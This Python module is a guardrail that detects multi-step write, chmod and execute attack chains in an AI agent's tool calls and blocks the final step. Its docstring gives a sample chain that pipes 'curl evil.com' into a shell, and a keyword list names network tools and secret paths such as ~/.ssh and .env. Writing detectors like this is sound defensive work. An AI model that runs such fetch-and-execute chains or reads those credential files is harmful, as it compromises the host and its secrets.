"""Chain-attack detector for multi-step tool sequences.

A single tool call in isolation may look benign, but the classic attack chain is:

    write_file("malware.sh", "...curl evil.com | sh...")  # plant
    run_shell("chmod +x malware.sh")                       # arm
    run_shell("./malware.sh")                              # fire

The blacklist sees each step in isolation and lets each one through; the
chain only becomes dangerous when correlated across calls.

Two-layer detection (Phase A.3):

* **Run-level** (default, current behavior): correlation state lives on the
  ``AgentRun`` instance. Detects chains within a single conversation turn.
* **Session-level** (opt-in via ``session_scope=True``): correlation state
  persists in ``session_chain_state`` table, keyed by (chat_id, agent_id).
  Detects chains across multiple messages with TTL cleanup.

Two-phase API (kept deliberately separate so a tool failure does not poison
the run state):

* ``evaluate_before_tool`` runs BEFORE the tool executes. If the call would
  complete a malicious chain, returns a dict carrying an ``audit_event`` for
  the gateway to log; otherwise returns ``None``.
* ``observe_after_tool`` runs AFTER the tool returns. It only records state
  on success, so failed writes / failed chmods don't fake out the detector.

Risk progression (per script path tracked on the run):

* ``script_only``       — script was written, no action taken
* ``script_and_chmod``  — chmod +x / 755 ran against it (warn-worthy)
* ``full_chain``        — that script is now being executed (BLOCK)
"""

from __future__ import annotations

import hashlib
import time
from typing import Any, Optional


# Default TTL for session-level chain state: 7 days
DEFAULT_SESSION_TTL_SECONDS = 7 * 24 * 3600


# Extensions we treat as "scripts worth tracking" when written.
_SCRIPT_EXTENSIONS: tuple[str, ...] = (
    ".sh",
    ".bash",
    ".zsh",
    ".py",
    ".pl",
    ".rb",
)

# Substrings inside a written script's content that escalate the audit
# event (do not change the block decision; full_chain blocks regardless).
_DEFAULT_HIGH_RISK_KEYWORDS: list[str] = [
    "curl",
    "wget",
    "rm -rf",
    "sudo",
    "chmod 777",
    "~/.ssh",
    "/etc/passwd",
    ".env",
    "eval",
    "exec",
    "nc ",
    "netcat",
    "/bin/sh",
    "/bin/bash",
]

# Risk level constants (also used as audit-event field values).
RISK_SCRIPT_ONLY = "script_only"
RISK_SCRIPT_AND_CHMOD = "script_and_chmod"
RISK_FULL_CHAIN = "full_chain"


class ChainDetector:
    """Detect write -> chmod -> exec chains within and across AgentRuns.

    Run-level: correlation state lives on the ``AgentRun`` instance via
    ``run.written_scripts`` (dict[path, content]) and ``run.dangerous_actions``.

    Session-level (opt-in): state persists in ``session_chain_state`` table,
    keyed by (chat_id, agent_id), enabling detection across messages.
    """

    def __init__(
        self,
        config: Optional[dict[str, Any]] = None,
        storage: Any = None,
    ) -> None:
        config = config or {}
        self._enabled: bool = bool(config.get("enabled", True))
        self._high_risk_keywords: list[str] = list(
            config.get("high_risk_keywords", _DEFAULT_HIGH_RISK_KEYWORDS)
        )
        # Session-level scope: default OFF for backward compatibility
        self._session_scope: bool = bool(config.get("session_scope", False))
        self._session_ttl: int = int(
            config.get("session_ttl", DEFAULT_SESSION_TTL_SECONDS)
        )
        self._storage = storage

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def evaluate_before_tool(
        self,
        tool_call: Any,
        run: Any,
        ctx: dict[str, Any],
    ) -> Optional[dict[str, Any]]:
        """Inspect a tool call about to run.

        Returns a dict ``{"action", "reason", "audit_event"}`` when the call
        completes a malicious chain and should be blocked. Returns ``None``
        otherwise.
        """
        if not self._enabled:
            return None

        tool_name, args = _unpack_tool_call(tool_call)
        if tool_name != "run_shell":
            return None

        cmd = _coerce_str(args.get("command") or args.get("cmd"))
        if not cmd:
            return None

        # 1. Check run-level state (fast path)
        run_decision = self._check_run_level(run, cmd, ctx)
        if run_decision is not None:
            return run_decision

        # 2. Check session-level state (cross-message)
        if self._session_scope and self._storage is not None:
            session_decision = self._check_session_level(cmd, ctx)
            if session_decision is not None:
                return session_decision

        return None

    def _check_run_level(
        self, run: Any, cmd: str, ctx: dict[str, Any]
    ) -> Optional[dict[str, Any]]:
        """Run-level chain detection (in-memory state)."""
        written_scripts: dict[str, str] = getattr(run, "written_scripts", None) or {}
        dangerous_actions: dict[str, Any] = getattr(run, "dangerous_actions", None) or {}

        matched_script = _find_executed_script(cmd, written_scripts)
        if matched_script is None:
            return None

        risk_level = _classify_risk(
            matched_script, written_scripts, dangerous_actions
        )

        if risk_level != RISK_FULL_CHAIN:
            return None

        content = written_scripts.get(matched_script, "") or ""
        matched_keywords = [kw for kw in self._high_risk_keywords if kw in content]

        audit_event = {
            "event_type": "chain_attack_blocked",
            "tool": "run_shell",
            "command": cmd,
            "script_path": matched_script,
            "risk_level": risk_level,
            "scope": "run",
            "matched_keywords": matched_keywords,
            "recorded_actions": _serialize_actions(dangerous_actions),
            "agent_id": ctx.get("agent_id") if isinstance(ctx, dict) else None,
            "chat_id": ctx.get("chat_id") if isinstance(ctx, dict) else None,
        }

        return {
            "action": "deny",
            "reason": (
                "multi-step attack detected (write -> chmod -> execute). "
                "debug_id={debug_id}"
            ),
            "risk_level": risk_level,
            "audit_event": audit_event,
        }

    def _check_session_level(
        self, cmd: str, ctx: Any
    ) -> Optional[dict[str, Any]]:
        """Session-level chain detection (DB-backed, cross-message).

        Accepts ctx as either dict or AgentContext-like object with
        ``chat_id`` and ``agent_id`` attributes.
        """
        chat_id, agent_id = _ctx_chat_agent(ctx)
        if not chat_id or not agent_id:
            return None

        # Fetch all unexpired chain state for this (chat_id, agent_id)
        now = int(time.time())
        rows = self._storage.fetchall(
            "SELECT script_path, chmod_applied FROM session_chain_state "
            "WHERE chat_id = ? AND agent_id = ? AND expires_at > ?",
            (chat_id, agent_id, now),
        )
        if not rows:
            return None

        # Find script being executed
        for row in rows:
            script_path = row["script_path"]
            if not script_path:
                continue
            if script_path in cmd or f"./{script_path}" in cmd:
                # Check if chmod was applied
                if row["chmod_applied"]:
                    audit_event = {
                        "event_type": "chain_attack_blocked",
                        "tool": "run_shell",
                        "command": cmd,
                        "script_path": script_path,
                        "risk_level": RISK_FULL_CHAIN,
                        "scope": "session",
                        "agent_id": agent_id,
                        "chat_id": chat_id,
                    }
                    return {
                        "action": "deny",
                        "reason": (
                            "multi-step attack detected across messages "
                            "(write -> chmod -> execute). debug_id={debug_id}"
                        ),
                        "risk_level": RISK_FULL_CHAIN,
                        "audit_event": audit_event,
                    }
        return None

    def observe_after_tool(
        self,
        tool_call: Any,
        run: Any,
        result: Any,
        success: bool,
        ctx: Optional[dict[str, Any]] = None,
    ) -> None:
        """Record state changes from a tool that just ran.

        Updates both run-level and (if enabled) session-level state.
        """
        if not self._enabled or not success:
            return

        tool_name, args = _unpack_tool_call(tool_call)

        # Lazily ensure containers exist on the run
        if getattr(run, "written_scripts", None) is None:
            run.written_scripts = {}
        if getattr(run, "dangerous_actions", None) is None:
            run.dangerous_actions = {}

        if tool_name == "write_file":
            path = _coerce_str(args.get("path") or args.get("file"))
            if path and _looks_like_script(path):
                content = _coerce_str(args.get("content"))
                run.written_scripts[path] = content
                # Also persist to session state if enabled
                if self._session_scope and self._storage is not None and ctx:
                    self._persist_script_write(path, content, ctx)
            return

        if tool_name == "run_shell":
            cmd = _coerce_str(args.get("command") or args.get("cmd"))
            if not cmd:
                return
            if _is_chmod_executable(cmd):
                targets = [
                    path for path in run.written_scripts if path and path in cmd
                ]
                existing = run.dangerous_actions.get("chmod")
                if isinstance(existing, list):
                    for t in targets:
                        if t not in existing:
                            existing.append(t)
                else:
                    run.dangerous_actions["chmod"] = targets if targets else True

                # Also persist chmod to session state if enabled
                if self._session_scope and self._storage is not None and ctx:
                    self._persist_chmod(cmd, ctx)

    def _persist_script_write(
        self, script_path: str, content: str, ctx: Any
    ) -> None:
        """Persist a script write to session_chain_state."""
        chat_id, agent_id = _ctx_chat_agent(ctx)
        if not chat_id or not agent_id:
            return

        now = int(time.time())
        expires_at = now + self._session_ttl
        content_hash = hashlib.md5(content.encode("utf-8", errors="replace")).hexdigest()

        # Upsert: INSERT OR REPLACE
        self._storage.execute(
            "INSERT OR REPLACE INTO session_chain_state "
            "(chat_id, agent_id, script_path, content_hash, chmod_applied, created_at, expires_at) "
            "VALUES (?, ?, ?, ?, "
            "  COALESCE((SELECT chmod_applied FROM session_chain_state "
            "    WHERE chat_id=? AND agent_id=? AND script_path=?), 0), "
            "?, ?)",
            (chat_id, agent_id, script_path, content_hash,
             chat_id, agent_id, script_path,
             now, expires_at),
        )

    def _persist_chmod(self, cmd: str, ctx: Any) -> None:
        """Persist a chmod action to session_chain_state."""
        chat_id, agent_id = _ctx_chat_agent(ctx)
        if not chat_id or not agent_id:
            return

        # Find which scripts this chmod targets
        rows = self._storage.fetchall(
            "SELECT script_path FROM session_chain_state "
            "WHERE chat_id = ? AND agent_id = ?",
            (chat_id, agent_id),
        )
        for row in rows:
            script_path = row["script_path"]
            if script_path and script_path in cmd:
                self._storage.execute(
                    "UPDATE session_chain_state SET chmod_applied = 1 "
                    "WHERE chat_id = ? AND agent_id = ? AND script_path = ?",
                    (chat_id, agent_id, script_path),
                )

    def cleanup_expired(self) -> int:
        """Remove expired session_chain_state rows.

        Returns:
            Number of rows deleted.
        """
        if self._storage is None:
            return 0
        now = int(time.time())
        cursor = self._storage.execute(
            "DELETE FROM session_chain_state WHERE expires_at <= ?",
            (now,),
        )
        return cursor.rowcount


# ----------------------------------------------------------------------
# Module helpers (kept module-level so they're easy to unit-test)
# ----------------------------------------------------------------------


def _ctx_chat_agent(ctx: Any) -> tuple[Optional[str], Optional[str]]:
    """Extract (chat_id, agent_id) from ctx (dict or AgentContext-like)."""
    if isinstance(ctx, dict):
        return ctx.get("chat_id"), ctx.get("agent_id")
    return getattr(ctx, "chat_id", None), getattr(ctx, "agent_id", None)


def _unpack_tool_call(tool_call: Any) -> tuple[str, dict[str, Any]]:
    """Normalize a tool call into (name, args).

    Accepts either a dict with ``name``/``arguments`` (or ``tool``/``args``)
    or an object exposing those as attributes.
    """
    if isinstance(tool_call, dict):
        name = tool_call.get("name") or tool_call.get("tool") or ""
        args = tool_call.get("arguments")
        if args is None:
            args = tool_call.get("args")
        if not isinstance(args, dict):
            args = {}
        return str(name), args

    name = getattr(tool_call, "name", None) or getattr(tool_call, "tool", "")
    args = getattr(tool_call, "arguments", None)
    if args is None:
        args = getattr(tool_call, "args", None)
    if not isinstance(args, dict):
        args = {}
    return str(name or ""), args


def _coerce_str(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, str):
        return value
    return str(value)


def _looks_like_script(path: str) -> bool:
    return path.lower().endswith(_SCRIPT_EXTENSIONS)


def _is_chmod_executable(cmd: str) -> bool:
    # Match ``chmod +x``, ``chmod 755``, and a couple of common variants.
    # Kept as substring checks rather than a regex to stay readable; the
    # detector is a defense-in-depth layer, not the primary blacklist.
    return (
        "chmod +x" in cmd
        or "chmod 755" in cmd
        or "chmod 777" in cmd
        or "chmod a+x" in cmd
        or "chmod u+x" in cmd
    )


def _find_executed_script(
    cmd: str, written_scripts: dict[str, str]
) -> Optional[str]:
    """Return the recorded script path that *cmd* appears to invoke."""
    for path in written_scripts:
        if not path:
            continue
        if path in cmd or f"./{path}" in cmd:
            return path
    return None


def _classify_risk(
    script_path: str,
    written_scripts: dict[str, Any],
    dangerous_actions: dict[str, Any],
) -> str:
    """Classify the chain state for *script_path*."""
    if script_path not in written_scripts:
        return RISK_SCRIPT_ONLY

    chmod_entry = dangerous_actions.get("chmod") if isinstance(dangerous_actions, dict) else None

    chmod_for_script = False
    if chmod_entry is True:
        chmod_for_script = True
    elif isinstance(chmod_entry, (list, tuple, set)):
        # Empty container means "chmod observed but no script-specific match";
        # treat as armed to stay conservative.
        chmod_for_script = (not chmod_entry) or (script_path in chmod_entry)
    elif chmod_entry:
        chmod_for_script = True

    if chmod_for_script:
        return RISK_FULL_CHAIN
    return RISK_SCRIPT_AND_CHMOD


def _serialize_actions(dangerous_actions: Any) -> Any:
    """Return a JSON-friendly snapshot of ``run.dangerous_actions`` for audit."""
    if isinstance(dangerous_actions, dict):
        return {k: list(v) if isinstance(v, (list, tuple, set)) else v
                for k, v in dangerous_actions.items()}
    if isinstance(dangerous_actions, (list, tuple, set)):
        return list(dangerous_actions)
    return dangerous_actions
